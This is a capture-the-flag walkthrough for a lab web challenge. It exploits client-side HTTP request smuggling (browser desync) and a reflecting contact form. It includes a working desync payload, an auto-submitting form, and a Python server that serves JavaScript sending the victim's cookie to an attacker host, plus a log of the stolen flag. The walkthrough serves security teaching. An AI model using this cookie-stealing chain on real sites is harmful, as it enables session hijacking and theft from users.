# Challenge Help

In this task, we will look for a possible way to solve the challenge of the previous task.

Firstly, you have to add in your `/etc/hosts` file the following entry:

```
MACHINE_IP challenge.thm
```

It can be observed that utilizing the given payload and refreshing the page results in a 404 error page. This indicates that the web server is vulnerable to request smuggling browser desync.

```javascript
fetch('http://challenge.thm/', {
    method: 'POST',
    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
    mode: 'cors',
})
```

Next, we can observe that the contact page does not correctly sanitize text input, potentially allowing us to send an arbitrary payload.

## Browser Desync Attack Vulnerable Functionality

Visiting `http://challenge.thm/securecontact` you can notice that the input from the message field is reflected but is not interpreted:

## Browser Desync Attack Secure Contact

The victim will instead visit another page `http://challenge.thm/vulnerablecontact` where the input will be interpreted.

## Browser Desync Attack Contact Vulnerable

Now, we just need to build our payload to redirect the victim user to fetch the second payload from our server:

```html
<form id="btn" action="http://challenge.thm/" method="POST" enctype="text/plain">
    <textarea name="GET http://YOUR_IP:1337 HTTP/1.1\r\nAAA: A">placeholder1</textarea>
    <button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```

Finally, we will serve a payload on our controlled server to steal the user's cookie and send it to us.

```python
#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"fetch('http://YOUR_IP:8080/' + document.cookie)")

def run_server(port=1337):
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

Run it with the following command:

```sh
sudo python3 server.py
```

Note that the victim will make an additional request to port 8080; you can serve another Python web service by using:

```sh
sudo python3 -m http.server 8080
```

Now, after around a minute, you should get the flag!

```sh
Terminal
root@attackbox ~ [1]> sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)
- - [18/Jan/2024 10:49:51] "GET /flag=THM{REDACTED} HTTP/1.1" 404 -
```